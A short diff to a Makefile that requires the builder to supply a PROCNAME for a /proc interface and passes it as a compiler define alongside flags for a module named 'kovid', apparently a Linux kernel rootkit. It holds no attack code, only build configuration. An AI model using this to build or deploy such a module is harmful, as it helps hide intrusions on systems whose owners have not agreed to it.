@@ -12,8 +12,20 @@ CTAGS=$(shell which ctags))
 JOURNALCTL := $(shell which journalctl)
 UUIDGEN := $(shell uuidgen)
 
-# PROCNAME, /proc/<name> interface. You must change it.
-COMPILER_OPTIONS := -Wall -DPROCNAME='"changeme"' \
+# TODO: Check if we can generate a random PROCNAME, something like:
+# PROCNAME ?= $(shell uuidgen | cut -c1-8)
+
+ifeq ($(origin PROCNAME), undefined)
+    $(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name")
+else ifeq ($(strip $(PROCNAME)),)
+    $(error ERROR: PROCNAME is empty. Please set PROCNAME to a non-empty value)
+endif
+
+# Display the selected PROCNAME during the build
+$(info -- Selected PROCNAME is $(PROCNAME))
+
+# PROCNAME, /proc/<name> interface.
+COMPILER_OPTIONS := -Wall -DPROCNAME='"$(PROCNAME)"' \
 	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK -DPRCTIMEOUT=1200 \
 	-DUUIDGEN=\"$(UUIDGEN)\" -DJOURNALCTL=\"$(JOURNALCTL)\"
 
